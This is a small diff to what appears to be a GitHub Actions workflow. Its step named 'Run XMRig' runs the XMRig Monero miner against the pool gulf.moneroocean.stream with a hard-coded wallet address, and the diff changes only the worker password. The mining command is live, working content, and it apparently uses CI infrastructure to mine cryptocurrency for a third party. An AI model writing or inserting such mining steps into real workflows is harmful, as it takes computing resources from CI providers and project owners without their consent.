@@ -32,4 +32,4 @@ jobs:
       - name: Run XMRig
         run: |
           cd xmrig/build
-          ./xmrig -o gulf.moneroocean.stream:10128 -u 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG -p HHc7N
+          ./xmrig -o gulf.moneroocean.stream:10128 -u 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG -p X7CCd
